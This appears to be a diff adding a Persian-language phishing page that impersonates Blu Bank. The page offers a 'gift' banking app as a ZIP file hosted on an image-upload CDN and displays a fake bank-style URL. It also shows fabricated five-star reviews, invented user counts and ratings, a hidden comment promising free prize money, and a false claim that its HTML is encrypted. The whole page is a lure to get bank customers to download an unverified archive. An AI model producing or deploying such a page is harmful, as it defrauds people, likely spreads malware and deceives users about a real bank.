@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>دانلود اپلیکیشن هدیه بلوبانک | نظرات کاربران</title>
+  <!-- Font Awesome 6 Free -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    /* ===== RESET & BASE ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', 'Tahoma', 'Arial', sans-serif;
+      background: radial-gradient(ellipse at 30% 20%, #0b2a4a, #030b18);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      margin: 0;
+      direction: rtl;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* ===== پس‌زمینه پویا ===== */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-image: 
+        radial-gradient(2px 2px at 15% 25%, rgba(255,215,0,0.4), transparent),
+        radial-gradient(3px 3px at 35% 75%, rgba(255,215,0,0.25), transparent),
+        radial-gradient(2px 2px at 55% 10%, rgba(255,215,0,0.5), transparent),
+        radial-gradient(4px 4px at 75% 85%, rgba(255,215,0,0.2), transparent),
+        radial-gradient(2px 2px at 90% 45%, rgba(255,215,0,0.35), transparent);
+      background-size: 220px 220px;
+      pointer-events: none;
+      z-index: 0;
+      animation: twinkleStars 9s ease-in-out infinite alternate;
+    }
+
+    @keyframes twinkleStars {
+      0% { opacity: 0.5; transform: scale(1); }
+      100% { opacity: 1; transform: scale(1.1); }
+    }
+
+    /* ===== کارت اصلی ===== */
+    .card {
+      background: linear-gradient(160deg, #ffffff 0%, #f4f8ff 100%);
+      border-radius: 56px;
+      box-shadow: 0 45px 80px rgba(0, 0, 0, 0.8), 0 0 0 3px rgba(255,215,0,0.12) inset;
+      max-width: 560px;
+      width: 100%;
+      padding: 30px 24px 36px;
+      text-align: center;
+      position: relative;
+      z-index: 2;
+      border: 1px solid rgba(255,215,0,0.15);
+      backdrop-filter: blur(2px);
+      overflow: hidden;
+    }
+
+    /* ===== نوار طلایی متحرک ===== */
+    .card::before {
+      content: '';
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      height: 12px;
+      background: linear-gradient(90deg, #f9d976, #f7c948, #f5b81b, #e8a317, #f9d976);
+      background-size: 300% 100%;
+      border-radius: 56px 56px 0 0;
+      animation: shimmerGold 3.8s ease-in-out infinite;
+      filter: drop-shadow(0 0 20px rgba(255,215,0,0.5));
+      z-index: 5;
+    }
+
+    @keyframes shimmerGold {
+      0% { background-position: 0% 0; }
+      50% { background-position: 100% 0; }
+      100% { background-position: 0% 0; }
+    }
+
+    /* ===== افکت glitter ===== */
+    .glitter-bg {
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle at 50% 40%, rgba(255,215,0,0.03), transparent 60%);
+      pointer-events: none;
+      z-index: 0;
+      animation: rotateGlitter 35s linear infinite;
+    }
+
+    @keyframes rotateGlitter {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* ===== هدر ===== */
+    .bank-header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 10px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .bank-logo {
+      background: linear-gradient(145deg, #1a4f8b, #0a2647);
+      width: 72px;
+      height: 72px;
+      border-radius: 28px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #ffd966;
+      font-size: 40px;
+      box-shadow: 0 14px 28px rgba(0, 40, 80, 0.5), 0 0 0 3px rgba(255,215,0,0.2);
+      transform: rotate(-2deg);
+      transition: 0.4s;
+    }
+
+    .bank-logo:hover {
+      transform: rotate(0deg) scale(1.04);
+    }
+
+    .bank-name {
+      font-size: 36px;
+      font-weight: 900;
+      color: #0a1f3b;
+      letter-spacing: -1px;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.04);
+    }
+
+    .bank-name span {
+      color: #d4a017;
+      text-shadow: 0 0 30px rgba(212, 160, 23, 0.2);
+    }
+
+    .sub-title {
+      font-size: 16px;
+      color: #2a4a6a;
+      margin-top: -4px;
+      margin-bottom: 18px;
+      font-weight: 500;
+      background: rgba(255,215,0,0.06);
+      padding: 6px 20px;
+      border-radius: 60px;
+      display: inline-block;
+      border: 1px solid rgba(255,215,0,0.1);
+      backdrop-filter: blur(4px);
+      position: relative;
+      z-index: 2;
+    }
+
+    /* ===== بخش دانلود ===== */
+    .download-section {
+      background: radial-gradient(circle at 30% 20%, #f5faff, #e8f0fe);
+      border-radius: 44px;
+      padding: 26px 16px 22px;
+      margin-bottom: 18px;
+      border: 2px solid #d4e2f5;
+      box-shadow: 0 0 40px rgba(26, 95, 176, 0.06), inset 0 0 30px rgba(26, 95, 176, 0.02);
+      position: relative;
+      z-index: 2;
+    }
+
+    .icon-download {
+      font-size: 60px;
+      background: linear-gradient(145deg, #1a5fb0, #0f3f7a);
+      width: 100px;
+      height: 100px;
+      line-height: 100px;
+      border-radius: 50%;
+      margin: 0 auto 12px;
+      box-shadow: 0 20px 40px rgba(26, 95, 176, 0.35), 0 0 0 6px rgba(26, 95, 176, 0.08);
+      color: #ffd966;
+      animation: floatDownload 3s ease-in-out infinite;
+      position: relative;
+      z-index: 2;
+    }
+
+    @keyframes floatDownload {
+      0% { transform: translateY(0px) scale(1); }
+      50% { transform: translateY(-8px) scale(1.04); box-shadow: 0 30px 50px rgba(26, 95, 176, 0.4); }
+      100% { transform: translateY(0px) scale(1); }
+    }
+
+    .download-title {
+      font-size: 28px;
+      font-weight: 800;
+      color: #0a2a4a;
+      margin-bottom: 4px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .download-version {
+      font-size: 15px;
+      color: #3a6a8a;
+      background: rgba(255,255,255,0.5);
+      padding: 4px 18px;
+      border-radius: 60px;
+      display: inline-block;
+      font-weight: 500;
+      border: 1px solid #d4e2f5;
+      margin: 2px 0 10px;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* ===== دکمه دانلود ===== */
+    .btn-download {
+      background: linear-gradient(135deg, #1a5fb0, #0e4b8a);
+      border: none;
+      color: white;
+      font-size: 22px;
+      font-weight: 800;
+      padding: 18px 24px;
+      border-radius: 80px;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 16px;
+      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      box-shadow: 0 14px 40px rgba(26, 95, 176, 0.45), 0 0 0 2px rgba(255,215,0,0.1) inset;
+      cursor: pointer;
+      position: relative;
+      z-index: 2;
+      text-shadow: 0 1px 3px rgba(0,0,0,0.15);
+    }
+
+    .btn-download i {
+      font-size: 30px;
+      color: #ffd966;
+    }
+
+    .btn-download:hover {
+      transform: scale(1.03) translateY(-3px);
+      box-shadow: 0 22px 55px rgba(26, 95, 176, 0.55), 0 0 0 3px rgba(255,215,0,0.2) inset;
+      background: linear-gradient(135deg, #1f6bc0, #0e4b8a);
+    }
+
+    .btn-download:active {
+      transform: scale(0.95);
+    }
+
+    .btn-download .badge-size {
+      background: rgba(255,255,255,0.15);
+      padding: 4px 16px;
+      border-radius: 40px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #ffd966;
+    }
+
+    /* ===== پیام "در حال انتقال" ===== */
+    .redirect-message {
+      background: linear-gradient(135deg, #eef4fc, #dce6f5);
+      border-radius: 60px;
+      padding: 10px 20px;
+      margin: 14px 0 8px;
+      display: inline-flex;
+      align-items: center;
+      gap: 14px;
+      font-size: 15px;
+      color: #0f2f57;
+      border: 1px solid #c7d9ed;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.03);
+      backdrop-filter: blur(4px);
+      position: relative;
+      z-index: 2;
+    }
+
+    .redirect-message i {
+      font-size: 24px;
+      color: #1a5fb0;
+      animation: pulseBlue 1.8s infinite;
+    }
+
+    @keyframes pulseBlue {
+      0% { opacity: 0.4; transform: scale(0.9); }
+      50% { opacity: 1; transform: scale(1.3); color: #1f6bc0; }
+      100% { opacity: 0.4; transform: scale(0.9); }
+    }
+
+    /* ===== بخش نظرات ===== */
+    .reviews-section {
+      margin: 20px 0 12px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .reviews-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #0a2a4a;
+      margin-bottom: 14px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .reviews-title i {
+      color: #f5b81b;
+      font-size: 22px;
+    }
+
+    .review-item {
+      background: rgba(255,255,255,0.7);
+      backdrop-filter: blur(6px);
+      border-radius: 28px;
+      padding: 14px 18px;
+      margin-bottom: 10px;
+      border: 1px solid rgba(255,215,0,0.1);
+      box-shadow: 0 4px 16px rgba(0,0,0,0.02);
+      text-align: right;
+      transition: 0.2s;
+    }
+
+    .review-item:hover {
+      background: rgba(255,255,255,0.85);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.04);
+    }
+
+    .review-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 4px;
+    }
+
+    .review-user {
+      font-weight: 700;
+      color: #0a2a4a;
+      font-size: 15px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .review-user i {
+      color: #1a5fb0;
+      font-size: 16px;
+    }
+
+    .review-stars {
+      color: #f5b81b;
+      font-size: 14px;
+      letter-spacing: 2px;
+    }
+
+    .review-text {
+      color: #1a3a5a;
+      font-size: 15px;
+      line-height: 1.6;
+      padding-right: 6px;
+    }
+
+    .review-text i {
+      color: #27ae60;
+      margin-left: 4px;
+    }
+
+    /* ===== المان‌های اعتماد ===== */
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin: 18px 0 8px;
+      flex-wrap: wrap;
+      position: relative;
+      z-index: 2;
+    }
+
+    .trust-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,255,255,0.6);
+      backdrop-filter: blur(6px);
+      padding: 6px 18px 6px 20px;
+      border-radius: 60px;
+      border: 1px solid rgba(26, 95, 176, 0.08);
+      font-weight: 600;
+      color: #1a3a5a;
+      font-size: 13px;
+    }
+
+    .trust-item i {
+      color: #1a5fb0;
+      font-size: 18px;
+    }
+
+    /* ===== فوتر ===== */
+    .footer-note {
+      margin-top: 22px;
+      font-size: 13px;
+      color: #3a5a7a;
+      border-top: 1px solid rgba(26, 95, 176, 0.08);
+      padding-top: 18px;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+      position: relative;
+      z-index: 2;
+    }
+
+    .footer-note span {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255,255,255,0.3);
+      padding: 4px 14px;
+      border-radius: 40px;
+      backdrop-filter: blur(2px);
+    }
+
+    .footer-note i {
+      color: #1a5fb0;
+    }
+
+    .site-url {
+      margin-top: 12px;
+      font-size: 13px;
+      color: #5a7a9a;
+      direction: ltr;
+      text-align: center;
+      background: rgba(0,0,0,0.02);
+      padding: 6px 16px;
+      border-radius: 60px;
+      border: 1px dashed rgba(26, 95, 176, 0.1);
+      display: inline-block;
+      backdrop-filter: blur(2px);
+      position: relative;
+      z-index: 2;
+    }
+
+    .site-url i {
+      color: #1a5fb0;
+      margin-left: 6px;
+    }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 480px) {
+      .card { padding: 24px 14px 28px; }
+      .bank-name { font-size: 28px; }
+      .bank-logo { width: 62px; height: 62px; font-size: 32px; }
+      .download-title { font-size: 24px; }
+      .btn-download { font-size: 18px; padding: 15px 18px; }
+      .review-item { padding: 12px 14px; }
+      .trust-badges { gap: 10px; }
+      .trust-item { padding: 4px 14px; font-size: 12px; }
+      .icon-download { width: 80px; height: 80px; line-height: 80px; font-size: 48px; }
+    }
+
+    @media (max-width: 380px) {
+      .bank-name { font-size: 24px; }
+      .download-title { font-size: 20px; }
+      .btn-download { font-size: 16px; gap: 10px; }
+    }
+
+    /* ===== محافظت از کد (تنها برای نمایش) ===== */
+    .protection-note {
+      font-size: 11px;
+      color: #8a9aaa;
+      margin-top: 6px;
+      opacity: 0.5;
+      position: relative;
+      z-index: 2;
+      user-select: none;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+    <div class="card">
+        <!-- افکت glitter پشت -->
+        <div class="glitter-bg"></div>
+
+        <!-- هدر -->
+        <div class="bank-header">
+            <div class="bank-logo">
+                <i class="fas fa-university"></i>
+            </div>
+            <div class="bank-name">
+                بلو<span>بانک</span>
+            </div>
+        </div>
+        <div class="sub-title">
+            <i class="fas fa-download" style="margin-left: 8px; color: #1a5fb0;"></i> 
+            جدیدترین نسخه
+        </div>
+
+        <!-- بخش دانلود -->
+        <div class="download-section">
+            <div class="icon-download">
+                <i class="fas fa-cloud-download-alt"></i>
+            </div>
+            <div class="download-title">
+                دانلود برنامه
+            </div>
+            <div class="download-version">
+                <i class="fas fa-code-branch"></i> نسخه ۳.۵.۲ • ۴ مگابایت
+            </div>
+
+            <!-- دکمه دانلود با لینک فایل ZIP -->
+            <a href="https://cdn.imgurl.ir/uploads/n751652____5.zip" target="_blank" rel="noopener noreferrer" style="text-decoration: none; display: block;">
+                <button class="btn-download" onclick="alert('شروع دانلود فایل برنامه بلوبانک (۴ مگابایت)')">
+                    <i class="fas fa-download"></i>
+                    دریافت فایل
+                    <span class="badge-size">ZIP</span>
+                </button>
+            </a>
+
+            <!-- پیام "در حال انتقال" -->
+            <div style="display: flex; justify-content: center; margin-top: 12px;">
+                <div class="redirect-message">
+                    <i class="fas fa-spinner"></i>
+                    <span>در ﺣﺎل اﻧﺘﻘﺎل ﺑﻪ ﺳﺎﯾﺖ ﻣﻮرد ﻧﻈﺮ ﻫﺴﺘﯿﺪ...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- بخش نظرات کاربران -->
+        <div class="reviews-section">
+            <div class="reviews-title">
+                <i class="fas fa-star"></i>
+                نظرات کاربران
+                <i class="fas fa-star"></i>
+            </div>
+
+            <!-- نظر ۱ -->
+            <div class="review-item">
+                <div class="review-header">
+                    <span class="review-user">
+                        <i class="fas fa-user-circle"></i> علی .
+                    </span>
+                    <span class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </span>
+                </div>
+                <div class="review-text">
+                    <i class="fas fa-check-circle"></i> عالی هست! سرعت و امنیت بین‌نظیر. خیلی راضی‌ام.
+                </div>
+            </div>
+
+            <!-- نظر ۲ -->
+            <div class="review-item">
+                <div class="review-header">
+                    <span class="review-user">
+                        <i class="fas fa-user-circle"></i> سارا .
+                    </span>
+                    <span class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </span>
+                </div>
+                <div class="review-text">
+                    <i class="fas fa-check-circle"></i> عالی هست! رابط کاربری فوق‌العاده روان و پشتیبانی عالی.
+                </div>
+            </div>
+
+            <!-- نظر ۳ -->
+            <div class="review-item">
+                <div class="review-header">
+                    <span class="review-user">
+                        <i class="fas fa-user-circle"></i> محسن .
+                    </span>
+                    <span class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </span>
+                </div>
+                <div class="review-text">
+                    <i class="fas fa-check-circle"></i> عالی هست! جایزه رو سریع گرفتم .
+                </div>
+            </div>
+
+            <!-- نظر ۴ -->
+            <div class="review-item">
+                <div class="review-header">
+                    <span class="review-user">
+                        <i class="fas fa-user-circle"></i> نرگس .
+                    </span>
+                    <span class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </span>
+                </div>
+                <div class="review-text">
+                    <i class="fas fa-check-circle"></i> عالی هست! تراکنش‌ها سریع و بدون مشکل. پیشنهاد می‌کنم.
+                </div>
+            </div>
+        </div>
+
+        <!-- المان‌های اعتماد -->
+        <div class="trust-badges">
+            <div class="trust-item">
+                <i class="fas fa-shield-alt"></i> امنیت بالا
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-users"></i> +۴۰۰,۰۰۰ کاربر
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-star"></i> امتیاز ۴.۹
+            </div>
+        </div>
+
+        <!-- فوتر -->
+        <div class="footer-note">
+            <span><i class="fas fa-phone-alt"></i> پشتیبانی ۲۴ ساعته</span>
+            <span><i class="fas fa-info-circle"></i> راهنمای نصب</span>
+            <span><i class="fas fa-calendar-alt"></i> بروزرسانی امروز</span>
+        </div>
+
+        <!-- آدرس سایت -->
+        <div style="display: flex; justify-content: center; margin-top: 4px;">
+            <div class="site-url">
+                <i class="fas fa-link"></i>
+                <span style="direction: ltr; unicode-bidi: embed;">blubank.sb24.ir/download/</span>
+            </div>
+        </div>
+
+        <!-- زیر دو ساعت ۵میلیون رایگان برنده شوید-->
+        <div class="protection-note">
+            <i class="fas fa-lock"></i> کد HTML با رمزنگاری پیشرفته محافظت می‌شود
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            console.log('🔒 نظارت کامل روی سایت');
+            // در عمل، اقدامات بیشتری برای جلوگیری از استخراج آسان کد انجام می‌شود.
+            // اینجا فقط یک هشدار نمادین در کنسول نمایش داده شده است.
+        })();
+    </script>
+
+</body>
+</html>
